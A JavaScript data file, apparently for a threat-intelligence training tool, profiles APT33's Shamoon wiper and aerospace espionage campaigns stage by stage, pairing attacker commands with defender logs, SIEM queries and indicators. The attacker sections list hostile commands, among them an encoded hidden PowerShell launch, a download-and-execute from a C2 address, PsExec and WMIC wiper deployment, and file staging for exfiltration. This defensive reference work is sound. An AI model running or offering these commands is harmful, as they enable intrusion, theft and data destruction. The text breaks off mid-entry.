const apt33 = {
  id: "apt33",
  name: "APT33",
  aliases: ["Elfin", "Refined Kitten", "HOLMIUM", "Magnallium"],
  origin: "Iran",
  motivation: "Espionage / Destructive",
  attribution: "Community Consensus",
  description:
    "APT33 is an Iranian state-sponsored threat actor attributed to Iran's IRGC or MOIS intelligence services. Active since at least 2013, APT33 is known for destructive wiper attacks against Gulf state energy companies and sustained espionage campaigns targeting aviation, aerospace, and defense sectors globally.",
  campaigns: [
    {
      id: "shamoon-revival-2016",
      name: "Operation Shamoon Revival",
      year: "2016–2018",
      target: "Saudi Arabian Energy Sector & Gulf States",
      summary:
        "APT33 orchestrated a wave of destructive Shamoon (DistTrack) wiper attacks against Saudi Aramco, SABIC, and multiple Gulf state government agencies — destroying tens of thousands of endpoints and erasing critical energy infrastructure data as a geopolitical warning.",
      sources: [
        { title: "Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.", publisher: "Symantec Threat Intelligence", url: "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/elfin-apt33-espionage" },
        { title: "Insights into Iranian Cyber Espionage: APT33 Targets Aerospace and Energy Sectors and Has Ties to Destructive Malware", publisher: "Mandiant (FireEye)", url: "https://www.mandiant.com/resources/blog/apt33-insights-into-iranian-cyber-espionage" },
        { title: "ICS-CERT Advisory ICSA-17-099-02 — Shamoon Destructive Malware", publisher: "CISA / ICS-CERT", url: "https://www.cisa.gov/news-events/ics-advisories/icsa-17-099-02" },
      ],
      diamondModel: {
        adversary: {
          name: "APT33 (Elfin / Refined Kitten / HOLMIUM)",
          sponsor: "Iranian IRGC or MOIS — Islamic Revolutionary Guard Corps / Ministry of Intelligence",
          aliases: ["Elfin", "Refined Kitten", "HOLMIUM", "Magnallium", "Peach Sandstorm"],
          motivation: "Geopolitical disruption of Saudi Arabia and Gulf state adversaries; sabotage of energy sector critical infrastructure",
        },
        capability: {
          malware: ["SHAMOON (DistTrack) wiper", "DROPSHOT dropper", "TURNEDUP RAT", "PoshC2 framework", "StoneDrill wiper"],
          ttps: ["T1566.001 — Spearphishing Attachment", "T1059.001 — PowerShell", "T1078 — Valid Accounts", "T1485 — Data Destruction", "T1041 — Exfil over C2"],
          sophistication: "Nation-State — custom wiper with MBR overwrite, simultaneous multi-system destruction, geopolitically timed strike",
        },
        infrastructure: {
          domains: ["update.saudiaramco-upd[.]com", "sap-cdn[.]com", "microsoft-update[.]ws"],
          ips: ["185.55.87[.]26", "91.219.237[.]229", "45.142.212[.]100"],
          hosting: "Iranian-controlled VPS (Choopa/Vultr), bulletproof hosting, fast-flux DNS infrastructure",
        },
        victim: {
          sectors: "Saudi Aramco, Saudi SABIC (petrochemical), Gulf state government ministries, Middle Eastern energy companies",
          geography: "Saudi Arabia, UAE, Kuwait, Qatar — Gulf Cooperation Council member states",
          targeting: "~35,000 endpoints destroyed at Saudi Aramco (2012 precedent repeated 2016–18); multiple simultaneous targeted wiper deployments",
        },
      },
      stages: [
        {
          id: "initial-access",
          name: "Spearphishing Attachment",
          ttp: "T1566.001",
          ttpName: "Phishing: Spearphishing Attachment",
          phase: "Initial Access",
          attacker: {
            summary:
              "APT33 sent targeted spearphishing emails to Saudi energy sector employees, disguised as HR communications and recruitment offers from legitimate Saudi companies. Emails contained malicious .doc attachments embedded with VBA macros that dropped the DROPSHOT loader. Lures referenced Saudi Aramco policies, SABIC contractor onboarding, and energy sector conference invitations to maximize open rates among targeted recipients.",
            tools: ["Custom spearphishing kit", "DROPSHOT dropper", "Macro-embedded .doc lures"],
            commands: [
              "// Email subject: 'RE: Aramco 2017 Employee Benefits Update — Action Required'",
              "// Sender: hr-noreply@aramco-benefits[.]com (APT33 typosquat domain)",
              "// Attachment: Aramco_Benefits_2017.doc (macro-enabled Word document)",
              "// VBA macro auto-executes on Open: drops DROPSHOT to %TEMP%",
              "// DROPSHOT payload: C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\msupd.exe",
            ],
          },
          defender: {
            logs: [
              "Email received from external domain matching energy sector keywords (email gateway log)",
              "Macro-enabled document opened by user (Office audit log, Event ID 4688 winword.exe)",
              "Child process spawned from winword.exe: cmd.exe or powershell.exe (Sysmon Event ID 1)",
              "New executable written to %TEMP% by Office process (Sysmon Event ID 11)",
            ],
            detection:
              "Block macro execution in Office via GPO (Attack Surface Reduction rules). Email gateway: flag .doc/.docm attachments from external senders in energy/oil/gas domains. Alert on any child process spawned from winword.exe or excel.exe. Sandbox all macro-enabled documents before delivery.",
            siemQuery:
              'index=endpoint EventCode=1 ParentImage="*\\winword.exe" Image IN ("*\\cmd.exe","*\\powershell.exe","*\\wscript.exe","*\\cscript.exe") | stats count by host, user, Image, CommandLine',
            ifMissed:
              "DROPSHOT loader executes on the victim workstation inside the Saudi energy network. APT33 establishes initial foothold within critical infrastructure. The TURNEDUP RAT is staged and beacon initiated. Attacker begins enumerating internal network for high-value IT and OT systems to ultimately deploy the SHAMOON wiper.",
          },
          iocs: [
            { type: "Domain", indicator: "aramco-benefits[.]com", description: "APT33 typosquat phishing domain impersonating Saudi Aramco HR — used to send spearphishing lure emails" },
            { type: "File", indicator: "Aramco_Benefits_2017.doc", description: "Macro-enabled Word document dropping DROPSHOT loader — APT33 Shamoon Revival phishing attachment" },
            { type: "File", indicator: "msupd.exe", description: "DROPSHOT loader dropped to %TEMP% by macro — decodes and executes TURNEDUP RAT in memory" },
          ],
        },
        {
          id: "execution",
          name: "PowerShell Execution",
          ttp: "T1059.001",
          ttpName: "Command and Scripting Interpreter: PowerShell",
          phase: "Execution",
          attacker: {
            summary:
              "DROPSHOT used PowerShell to download and decode the TURNEDUP RAT from APT33's C2 infrastructure, executing it in memory to avoid writing additional files to disk. PowerShell was also used extensively for internal reconnaissance: enumerating domain controllers, active directory structure, network shares, and identifying Windows endpoints in OT-adjacent network segments that would be targeted by the eventual SHAMOON wiper deployment.",
            tools: ["PowerShell", "DROPSHOT", "TURNEDUP RAT", "PoshC2"],
            commands: [
              "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...",
              "// Decoded: downloads TURNEDUP from C2 and executes in memory",
              "powershell.exe -c \"(New-Object Net.WebClient).DownloadString('http://185.55.87[.]26/update.php') | IEX\"",
              "powershell.exe -c \"Get-ADComputer -Filter * -Properties * | Select Name,OperatingSystem | Export-CSV C:\\Temp\\hosts.csv\"",
              "powershell.exe -c \"Get-NetShare -ComputerName (Get-Content C:\\Temp\\hosts.csv)\"",
            ],
          },
          defender: {
            logs: [
              "powershell.exe spawned with -enc or -nop -w hidden flags (Event ID 4688 + ScriptBlock logging)",
              "PowerShell ScriptBlock Log: Net.WebClient DownloadString or Invoke-Expression (Event ID 4104)",
              "Outbound HTTP from powershell.exe to uncategorized external IP (proxy/firewall log)",
              "Active Directory enumeration via PowerShell: Get-ADComputer bulk query (Event ID 4662)",
            ],
            detection:
              "Enable PowerShell ScriptBlock Logging (Event ID 4104) and Module Logging. Alert on base64-encoded PowerShell commands (-enc flag). Constrained Language Mode blocks most attacker PowerShell tradecraft. AMSI (Antimalware Scan Interface) integration catches many in-memory payload techniques.",
            siemQuery:
              'index=endpoint EventCode=4104 (ScriptBlockText="*DownloadString*" OR ScriptBlockText="*IEX*" OR ScriptBlockText="*Invoke-Expression*" OR ScriptBlockText="*-enc*") | stats count by host, user, ScriptBlockText',
            ifMissed:
              "APT33 completes internal reconnaissance via PowerShell. Domain topology, Windows endpoint inventory, and network share structure are mapped. TURNEDUP RAT establishes persistent access across multiple hosts. Attacker identifies the IT and OT-adjacent systems to stage SHAMOON and prepares the destructive payload for coordinated simultaneous deployment.",
          },
          iocs: [
            { type: "IP", indicator: "185.55.87[.]26", description: "APT33 TURNEDUP RAT C2 / PowerShell download server — destination for encoded payload retrieval" },
            { type: "File", indicator: "hosts.csv", description: "AD computer enumeration output staged in C:\\Temp\\ — used to map target systems for SHAMOON wiper deployment" },
            { type: "Command", indicator: "powershell.exe -nop -w hidden -enc <base64>", description: "AMSI-bypassing encoded PowerShell invocation pattern — drops TURNEDUP RAT via IEX DownloadString" },
          ],
        },
        {
          id: "privilege-escalation",
          name: "Valid Account Compromise",
          ttp: "T1078",
          ttpName: "Valid Accounts",
          phase: "Privilege Escalation",
          attacker: {
            summary:
              "APT33 leveraged TURNEDUP's credential harvesting capability to capture domain credentials from memory and keylogged input. High-privilege service accounts used by Saudi Aramco's enterprise IT were compromised, providing domain admin access. These credentials were used to deploy SHAMOON via legitimate Windows administrative channels (PSEXEC / WMI) across thousands of workstations simultaneously — making the destructive payload appear as an authorized IT operation.",
            tools: ["TURNEDUP RAT", "Custom credential dumper", "Mimikatz", "PsExec"],
            commands: [
              "// TURNEDUP in-memory credential harvest from LSASS",
              "// Targets: domain admin, enterprise IT admin service accounts",
              "net use \\\\DC01\\ADMIN$ /user:ARAMCO\\svc_deploy P@ssw0rd2017",
              "psexec.exe \\\\<target_list> -u ARAMCO\\svc_deploy -p P@ssw0rd2017 -d cmd.exe /c copy \\\\fileserver\\share\\disttrack.exe C:\\Windows\\disttrack.exe",
              "wmic /node:@targets.txt /user:svc_deploy /password:P@ssw0rd2017 process call create \"cmd.exe /c C:\\Windows\\disttrack.exe\"",
            ],
          },
          defender: {
            logs: [
              "LSASS memory access by non-system process (Sysmon Event ID 10, GrantedAccess 0x1010)",
              "Lateral authentication via service account from unusual workstation (Event ID 4624 Type 3)",
              "PsExec service installed on remote system: PSEXESVC (System Event ID 7045)",
              "WMIC remote process creation with explicit credentials (Event ID 4688 + 4648)",
            ],
            detection:
              "Enable LSASS Protected Process Light (PPL). Alert on service account logons from non-server source hosts. PSEXESVC installation is a reliable lateral movement indicator. Monitor for wmic.exe with /node: or /user: flags making remote connections across multiple hosts simultaneously.",
            siemQuery:
              'index=endpoint EventCode=7045 ServiceName="PSEXESVC" | stats count by host, user | join host [ search index=endpoint EventCode=4624 LogonType=3 AccountName="svc_*" | stats dc(host) as targets by AccountName | where targets > 5 ]',
            ifMissed:
              "APT33 deploys SHAMOON simultaneously across thousands of Aramco and SABIC endpoints using compromised service account credentials via legitimate admin tools. The mass deployment is indistinguishable from authorized IT operations until the wiper activates — at which point recovery becomes impossible for overwritten systems.",
          },
          iocs: [
            { type: "Tool", indicator: "PsExec (PSEXESVC)", description: "PsExec used for mass remote SHAMOON deployment across thousands of Saudi Aramco endpoints via compromised service account" },
            { type: "Event", indicator: "Event ID 7045 ServiceName=PSEXESVC across multiple hosts", description: "PsExec lateral deployment pattern: PSEXESVC service created on dozens+ hosts in short time window" },
            { type: "Command", indicator: "wmic /node:@targets.txt process call create", description: "WMI mass remote execution with @file syntax — deploying SHAMOON to bulk target list simultaneously" },
          ],
        },
        {
          id: "data-destruction",
          name: "Data Destruction — SHAMOON Wiper",
          ttp: "T1485",
          ttpName: "Data Destruction",
          phase: "Impact",
          attacker: {
            summary:
              "APT33 deployed the SHAMOON (DistTrack) wiper — a tri-component destructive malware including a dropper, a wiper module, and a reporter. The wiper overwrote the MBR with an image of a burning US flag (2012) or anti-Saudi government imagery (2016–18), then overwrote the first 1 MB of every disk sector with random data. A built-in timer triggered simultaneous destruction across all compromised Aramco and SABIC endpoints during off-hours, rendering ~35,000 workstations unrecoverable in a single night.",
            tools: ["SHAMOON (DistTrack)", "StoneDrill wiper", "RawDisk driver (Eldos)"],
            commands: [
              "// SHAMOON drops three components:",
              "//   Dropper: Spreads via network shares using harvested credentials",
              "//   Wiper:   Overwrites MBR + all disk sectors — uses Eldos RawDisk kernel driver",
              "//   Reporter: Sends destruction confirmation to C2 before wiping networking stack",
              "// Trigger: Built-in timer, activates at 08:00 local time (timed for off-hours in UTC)",
              "// MBR overwrite payload: burning flag image encoded in wiper binary",
              "// Result: system unbootable; full disk unrecoverable without clean reinstall",
            ],
          },
          defender: {
            logs: [
              "RawDisk kernel driver (Eldos) loaded — not a Microsoft-signed driver (System Event ID 7045)",
              "Mass file deletion / overwrite events across all drives (Sysmon Event ID 23/26)",
              "VSS (Volume Shadow Copy) deleted: vssadmin delete shadows /all /quiet (Event ID 8222)",
              "Simultaneous system crashes / blue screens across network segment (Windows Error Reporting)",
            ],
            detection:
              "Unsigned or unexpected kernel driver loads are critical alerts. Volume Shadow Copy deletion is a pre-wiper indicator: alert on any vssadmin delete shadows. EDR behavioral rules for mass file overwrite (>1000 files/minute) provide last-chance detection. Network isolation playbooks should trigger automatically on wiper behavioral signatures.",
            siemQuery:
              'index=endpoint EventCode=7045 ServiceName NOT IN (known_approved_drivers) | stats count by host, ServiceName, ServiceFileName | join host [ search index=endpoint EventCode=8222 | stats count by host ] | where count > 0',
            ifMissed:
              "SHAMOON activates simultaneously across thousands of endpoints. MBRs are overwritten, all disk data is destroyed. Systems are non-bootable and unrecoverable. Saudi Aramco lost ~35,000 workstations in 2012; the 2016–18 revival targeted similar scale. Recovery requires physical hardware replacement and OS reinstallation across entire fleets — taking weeks and costing hundreds of millions of dollars.",
          },
          iocs: [
            { type: "File", indicator: "disttrack.exe", description: "SHAMOON wiper binary — triple-component destructor (dropper + wiper + reporter) deployed by APT33 at Saudi Aramco" },
            { type: "Driver", indicator: "RawDisk (Eldos) elrawdsk.sys", description: "Kernel driver used by SHAMOON for direct disk sector access, bypassing OS filesystem protections for MBR overwrite" },
            { type: "SHA-256", indicator: "c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a", description: "SHAMOON 2 variant (2016–18 revival) — DistTrack wiper payload targeting Saudi energy sector" },
          ],
        },
        {
          id: "exfiltration",
          name: "Pre-Destruction Intelligence Exfiltration",
          ttp: "T1041",
          ttpName: "Exfiltration Over C2 Channel",
          phase: "Exfiltration",
          attacker: {
            summary:
              "Prior to SHAMOON deployment, APT33 used the TURNEDUP RAT's C2 channel to exfiltrate strategic intelligence: personnel records, energy production data, supplier contracts, and IT infrastructure diagrams from Saudi Aramco and SABIC networks. This pre-destruction collection maximized intelligence value before the wiper eliminated evidence of compromise — a dual-purpose operation combining espionage with destruction.",
            tools: ["TURNEDUP RAT", "PoshC2", "Custom compression utility"],
            commands: [
              "// TURNEDUP stages documents for exfil before wiper activation",
              "cmd.exe /c xcopy \\\\fileserver\\Corporate\\Contracts\\* C:\\Temp\\stage\\ /S /E /H /Y",
              "cmd.exe /c xcopy \\\\fileserver\\HR\\Personnel\\* C:\\Temp\\stage\\ /S /E /H /Y",
              "// Compress staged docs via TURNEDUP built-in routine",
              "// Exfil via HTTPS to 185.55.87[.]26 using TURNEDUP C2 protocol",
              "// Rate-limited: ~3 MB/min, timed to complete 48 hours before wiper trigger",
            ],
          },
          defender: {
            logs: [
              "Bulk xcopy across multiple file server shares (File Audit Event ID 4663 — access pattern)",
              "Large compressed archive created in C:\\Temp\\ (Sysmon Event ID 11)",
              "Sustained HTTPS upload from workstation to APT33 C2 IP (NetFlow/proxy)",
              "High-volume file read events from HR and Finance file server shares (DLP alert)",
            ],
            detection:
              "DLP: alert on bulk file reads from HR, Finance, and Contracts shares exceeding thresholds. NetFlow: flag sustained uploads exceeding 50 MB to uncategorized destinations from workstations. User behavioral analytics: after-hours bulk file access from accounts not normally accessing sensitive shares.",
            siemQuery:
              'index=network dest_port=443 bytes_out > 5000000 NOT dest IN (known_saas_list) src_category="workstation" | stats sum(bytes_out) as total by src_ip, dest_ip | where total > 50000000 | sort -total',
            ifMissed:
              "APT33 collects strategic Saudi energy sector intelligence including production data, contracts, and personnel records before SHAMOON destroys all evidence of the breach. Exfiltrated data informs Iranian strategic planning. The subsequent wiper destroys forensic artifacts, preventing full attribution and making data recovery or breach scope assessment nearly impossible.",
          },
          iocs: [
            { type: "IP", indicator: "91.219.237[.]229", description: "APT33 TURNEDUP exfiltration C2 server — destination for pre-wiper intelligence exfil over HTTPS" },
            { type: "Domain", indicator: "sap-cdn[.]com", description: "APT33 C2 domain impersonating SAP software CDN — used in TURNEDUP beacon communications during Shamoon Revival" },
            { type: "File", indicator: "C:\\Temp\\stage\\", description: "Staging directory used by APT33 to collect target documents before compression and exfiltration via TURNEDUP C2" },
          ],
        },
      ],
    },
    {
      id: "aviation-defense-2017",
      name: "Aviation & Defense Targeting",
      year: "2017–2019",
      target: "US & Saudi Aerospace / Defense Contractors",
      summary:
        "APT33 conducted a sustained espionage campaign against US and Saudi aerospace and defense contractors — including Boeing, Raytheon, Lockheed Martin, and Saudi defense entities — using LinkedIn-based spearphishing and credential harvesting portals to steal proprietary aviation engineering data and defense contract intelligence.",
      sources: [
        { title: "Insights into Iranian Cyber Espionage: APT33 Targets Aerospace and Energy Sectors", publisher: "Mandiant (FireEye)", url: "https://www.mandiant.com/resources/blog/apt33-insights-into-iranian-cyber-espionage" },
        { title: "HOLMIUM Targeting Aerospace, Defense, and Petrochemical Industries", publisher: "Microsoft Security", url: "https://www.microsoft.com/en-us/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/" },
        { title: "FBI Flash CU-000135-MW — Iranian Government-Sponsored APT Cyber Actions", publisher: "FBI / CISA", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-321a" },
      ],
      diamondModel: {
        adversary: {
          name: "APT33 (Elfin / HOLMIUM / Peach Sandstorm)",
          sponsor: "Iranian IRGC or MOIS — likely tasked by Iranian Air Force / aerospace program",
          aliases: ["Elfin", "HOLMIUM", "Magnallium", "Peach Sandstorm", "Refined Kitten"],
          motivation: "Strategic espionage: steal aerospace engineering IP and defense procurement data to advance Iranian aviation and missile programs",
        },
        capability: {
          malware: ["TURNEDUP RAT", "NANOCORE RAT", "NETWIRE RAT", "AutoIt-based credential harvester", "PoshC2"],
          ttps: ["T1566.002 — Spearphishing Link", "T1204.002 — Malicious File", "T1056.001 — Keylogging", "T1005 — Local Data Collection", "T1567 — Exfil Over Web Service"],
          sophistication: "Nation-State — LinkedIn persona infrastructure, defense-themed lures, multiple RAT families, multi-year sustained operation",
        },
        infrastructure: {
          domains: ["boeing-jobs[.]com", "raytheon-careers[.]net", "lockheed-hr[.]com", "sa-defense[.]org"],
          ips: ["45.142.212[.]100", "91.219.237[.]229", "185.25.51[.]198"],
          hosting: "NameCheap / Epik registrars, PJSC Rostelecom (AS12389), virtual private servers with defense-themed domains",
        },
        victim: {
          sectors: "Aerospace OEMs (Boeing, Lockheed Martin), defense prime contractors (Raytheon, Northrop Grumman), Saudi defense ministry suppliers, petrochemical engineering firms",
          geography: "United States (defense-industrial base), Saudi Arabia, South Korea, India — countries with advanced aerospace programs",
          targeting: "Individual engineers and program managers at defense primes identified via LinkedIn; estimated dozens of contractors compromised over 2-year period",
        },
      },
      stages: [
        {
          id: "initial-access",
          name: "LinkedIn Spearphishing Link",
          ttp: "T1566.002",
          ttpName: "Phishing: Spearphishing Link",
          phase: "Initial Access",
          attacker: {
            summary:
              "APT33 created realistic LinkedIn profiles impersonating HR recruiters at Boeing, Raytheon, and Lockheed Martin. They sent InMail messages to identified aerospace engineers and program managers offering competitive salary positions. Messages contained links to professionally-designed fake career portals that harvested corporate credentials or delivered malware-laced 'job application' documents. APT33 researched targets' actual roles to craft highly relevant lures.",
            tools: ["Fake LinkedIn recruiter personas", "Credential harvesting portal kit", "Custom typosquat domains"],
            commands: [
              "// LinkedIn InMail lure: sent from 'Boeing Talent Acquisition' persona",
              "// Subject: 'Exclusive Opportunity: Senior Avionics Systems Engineer — $145K Base'",
              "// Link: https://boeing-jobs[.]com/apply?ref=<target_id>&position=avionics-sr",
              "// Site: pixel-perfect Boeing HR clone; captures corporate SSO credentials",
              "// Alternate delivery: link to 'position brief' PDF containing embedded TURNEDUP dropper",
            ],
          },
          defender: {
            logs: [
              "Employee reports suspicious LinkedIn InMail from unrecognized recruiter (user report / phishing mailbox)",
              "DNS query to typosquat career domain from corporate network (DNS log / proxy)",
              "SSO credential submitted to non-corporate domain (IdP / CASB alert)",
              "PDF download from uncategorized domain opened by user (EDR process event)",
            ],
            detection:
              "CASB: alert on corporate credential submission to non-approved domains. DNS: monitor for newly-registered domains matching company name patterns (e.g., boeing-*.com). Security awareness training: recurring LinkedIn phishing simulations targeting engineering personas. DMARC enforcement reduces email-based LinkedIn lure delivery.",
            siemQuery:
              'index=proxy action=allowed dest_domain NOT IN (approved_domains_list) (dest_domain="*boeing*" OR dest_domain="*raytheon*" OR dest_domain="*lockheed*" OR dest_domain="*northrop*") | stats count by src_ip, dest_domain, user',
            ifMissed:
              "APT33 harvests valid corporate credentials for aerospace defense contractors' networks, or gains an initial execution foothold via malware-laced job documents. With valid VPN or Citrix credentials, lateral movement into defense engineering systems becomes trivial. The attacker's access to proprietary aircraft design data and defense contract specifics directly benefits Iranian aerospace programs.",
          },
          iocs: [
            { type: "Domain", indicator: "boeing-jobs[.]com", description: "APT33 fake Boeing careers portal — credential harvesting site and TURNEDUP RAT payload delivery domain" },
            { type: "Domain", indicator: "raytheon-careers[.]net", description: "APT33 fake Raytheon HR portal — spearphishing landing page targeting Raytheon defense engineers" },
            { type: "URL", indicator: "https://boeing-jobs[.]com/apply?ref=<target_id>", description: "Personalized phishing link sent via LinkedIn InMail — tracks individual targets and delivers credential harvester" },
          ],
        },
        {
          id: "execution",
          name: "Malicious File Execution",
          ttp: "T1204.002",
          ttpName: "User Execution: Malicious File",
          phase: "Execution",
          attacker: {
            summary:
              "Targets who clicked through the fake recruitment portal were prompted to download a 'position requirements brief' or 'application form' — a macro-enabled Word document or disguised executable that dropped the TURNEDUP RAT or NANOCORE RAT. The documents were professionally formatted with authentic-looking Boeing or Raytheon branding, company logos, and boilerplate legal text. Macros executed silently, installing the RAT while presenting a legitimate-looking document to the target.",
            tools: ["TURNEDUP RAT", "NANOCORE RAT", "NETWIRE RAT", "Macro-laced Office documents"],
            commands: [
              "// Fake document: 'Boeing_SeniorEngineer_Requirements_2018.docx'",
              "// VBA macro on Document_Open: drops RAT to %APPDATA%\\Microsoft\\Windows\\",
              "cmd.exe /c copy %TEMP%\\MSUpdate.exe %APPDATA%\\Microsoft\\Windows\\MSUpdate.exe",
              "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MSUpdate /d %APPDATA%\\Microsoft\\Windows\\MSUpdate.exe /f",
              "// TURNEDUP beacon: POST /api/update HTTP/1.1 to boeing-jobs[.]com",
              "// User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36",
            ],
          },
          defender: {
            logs: [
              "Macro-enabled document opened from Downloads or email (Event ID 4688: winword.exe)",
              "Child process spawned from winword.exe: cmd.exe writing to %APPDATA% (Sysmon Event ID 1)",
              "New Run key registry entry added for persistence (Event ID 4657 / Sysmon Event ID 13)",
              "Outbound HTTPS from MSUpdate.exe to non-Microsoft domain (proxy/firewall log)",
            ],
            detection:
              "ASR rule: Block Office applications from creating child processes. Attack Surface Reduction (Event ID 1121) catches this pattern. Disable VBA macros globally via GPO. Alert on any new Run key additions from Office processes or cmd.exe children. Application whitelisting prevents execution of unsigned binaries dropped to %APPDATA%.",
            siemQuery:
              'index=endpoint EventCode=13 TargetObject="*\\CurrentVersion\\Run*" Image NOT IN ("C:\\\\Program Files\\\\*","C:\\\\Windows\\\\*") | stats count by host, user, Image, TargetObject, Details',
            ifMissed:
              "APT33 establishes persistent RAT access on the aerospace engineer's workstation, which is connected to defense engineering networks and classified project file servers. TURNEDUP or NANOCORE provides full remote access including keylogging, file exfiltration, screenshot capture, and credential harvesting. The attacker silently inventories all accessible defense projects and engineering documents.",
          },
          iocs: [
            { type: "File", indicator: "MSUpdate.exe (%APPDATA%\\Microsoft\\Windows\\)", description: "TURNEDUP RAT dropped by macro-laced job document — uses Windows Update filename for defense evasion" },
            { type: "Registry", indicator: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSUpdate", description: "Persistence registry key added by TURNEDUP dropper — survives logout and reboot cycles" },
            { type: "Domain", indicator: "lockheed-hr[.]com", description: "APT33 C2 and phishing domain impersonating Lockheed Martin HR — used for TURNEDUP RAT command and control" },
          ],
        },
        {
          id: "keylogging",
          name: "Keylogging & Credential Capture",
          ttp: "T1056.001",
          ttpName: "Input Capture: Keylogging",
          phase: "Collection",
          attacker: {
            summary:
              "APT33's TURNEDUP RAT included a built-in keylogger that captured all keystrokes, including VPN credentials, CAD tool logins, classified network passwords, and defense program access codes. Keylog data was periodically encrypted and transmitted to APT33 C2 servers. Captured credentials were used to access defense contractor VPN, Citrix, and SharePoint environments to expand lateral access beyond the initially-compromised workstation.",
            tools: ["TURNEDUP RAT (built-in keylogger)", "NANOCORE keylogger module", "Custom credential parser"],
            commands: [
              "// TURNEDUP keylogger hooks Windows keyboard events via SetWindowsHookEx",
              "// Logs stored encrypted in: %APPDATA%\\Microsoft\\Windows\\keydata.dat",
              "// Periodic transmission: HTTP POST to C2 every 300 seconds",
              "// Keylog captures: VPN credentials, CAD tool (CATIA/SolidWorks) logins",
              "// Targets: classified project codes, engineering portal passwords, defense SharePoint auth",
              "// Special capture: clipboard monitoring for password manager pastes",
            ],
          },
          defender: {
            logs: [
              "SetWindowsHookEx API call for WH_KEYBOARD_LL hook from non-standard process (EDR API monitoring)",
              "Encrypted file written periodically to %APPDATA%: keydata.dat or similar (Sysmon Event ID 11)",
              "Periodic HTTPS POST from RAT process to C2 (proxy/firewall — small, regular intervals)",
              "Clipboard access by non-user-facing process (EDR behavioral: ReadClipboard API from background process)",
            ],
            detection:
              "EDR behavioral detection: alert on SetWindowsHookEx WH_KEYBOARD_LL hook from non-system, non-accessibility processes. User reports of unusual lag or application behavior on workstation can indicate hook-based keylogger. Zero-trust VPN with MFA prevents stolen static credentials from enabling lateral access.",
            siemQuery:
              'index=endpoint process_name NOT IN ("OneDrive.exe","Slack.exe","Teams.exe","explorer.exe") api_name="SetWindowsHookEx" hook_type="WH_KEYBOARD_LL" | stats count by host, user, process_name, process_path',
            ifMissed:
              "APT33 collects VPN credentials, classified project passwords, and CAD tool logins for all projects the target works on. With these credentials, the attacker can authenticate directly to defense contractor VPN, bypassing the compromised workstation entirely. Access extends to classified Boeing 737 MAX avionics specs, Raytheon missile guidance systems, and Saudi defense procurement contracts — directly benefiting Iranian aerospace and military programs.",
          },
          iocs: [
            { type: "File", indicator: "keydata.dat (%APPDATA%\\Microsoft\\Windows\\)", description: "TURNEDUP RAT encrypted keylog storage file — contains captured credentials and keystrokes" },
            { type: "IP", indicator: "45.142.212[.]100", description: "APT33 TURNEDUP C2 server receiving periodic encrypted keylog transmissions from compromised defense contractor workstations" },
            { type: "Event", indicator: "SetWindowsHookEx WH_KEYBOARD_LL from non-system process", description: "EDR API telemetry indicator: low-level keyboard hook installation by TURNEDUP RAT keylogger component" },
          ],
        },
        {
          id: "collection",
          name: "Data Collection from Local Systems",
          ttp: "T1005",
          ttpName: "Data from Local System",
          phase: "Collection",
          attacker: {
            summary:
              "APT33 used TURNEDUP's file collection module to systematically harvest aerospace engineering files, defense contract documents, and proprietary technical specifications from compromised workstations and accessible network shares. The RAT searched for CAD files (.catia, .prt, .asm, .sldprt), PDF specifications, Excel budget files, and Word contract documents. Files were compressed and encrypted before staging for exfiltration.",
            tools: ["TURNEDUP RAT file collector", "cmd.exe", "7-Zip (renamed binary)"],
            commands: [
              "cmd.exe /c dir /s /b C:\\ 2>nul | findstr /i \".catia .prt .asm .sldprt .dwg .pdf .xlsx\" > C:\\Temp\\filelist.txt",
              "cmd.exe /c xcopy @C:\\Temp\\filelist.txt C:\\Temp\\collect\\ /H /Y",
              "// Also harvest from network shares via captured credentials",
              "net use Z: \\\\engserver01\\Projects /user:CORP\\svc_eng P@ssEngr2018!",
              "cmd.exe /c xcopy Z:\\F-35_Avionics\\* C:\\Temp\\collect\\ /S /E /H /Y",
              "// Stage: C:\\Temp\\sysdata\\out.7z — compressed, AES-256 key from C2",
            ],
          },
          defender: {
            logs: [
              "Bulk file search across C:\\ with aerospace-specific extensions (Sysmon Event ID 1 — findstr with extension list)",
              "xcopy reading from network shares with explicit credentials (Event ID 4648 + File Audit 4663)",
              "New network drive mapped with service account credentials from anomalous workstation (Event ID 4624 Type 3)",
              "Large compressed archive created in C:\\Temp\\ by non-user process (Sysmon Event ID 11)",
            ],
            detection:
              "DLP: classify and alert on access to CAD files (.catia, .dwg, .prt, .sldprt) outside of authorized engineering workstations. Network share auditing: alert on bulk reads (>50 files/minute) from engineering file servers. User behavioral analytics: flag employees accessing projects outside their role assignments. Audit service account lateral authentication to file servers.",
            siemQuery:
              'index=endpoint EventCode=4663 ObjectName="*\\\\Projects\\\\*" AccessMask="0x1" | stats count as reads by SubjectUserName, ObjectName | where reads > 100 | sort -reads',
            ifMissed:
              "APT33 systematically collects gigabytes of proprietary aerospace engineering data: aircraft design specs, avionics system documentation, missile guidance schematics, and classified contract details. This IP directly enables Iran's domestic aviation and missile programs, shortcutting years of R&D. The theft may not be discovered for months or years, by which time the intelligence has been fully exploited.",
          },
          iocs: [
            { type: "File", indicator: "filelist.txt (C:\\Temp\\)", description: "APT33 TURNEDUP target file inventory — lists aerospace engineering files staged for exfiltration" },
            { type: "File", indicator: "sysdata (directory, C:\\Temp\\)", description: "APT33 collection staging directory — contains compressed, encrypted engineering documents pre-exfil" },
            { type: "Command", indicator: "findstr /i \".catia .prt .asm .sldprt .dwg\"", description: "APT33 TURNEDUP search pattern for aerospace CAD engineering files across compromised workstation drives" },
          ],
        },
        {
          id: "exfiltration",
          name: "Exfiltration Over Web Service",
          ttp: "T1567",
          ttpName: "Exfiltration Over Web Service",
          phase: "Exfiltration",
          attacker: {
            summary:
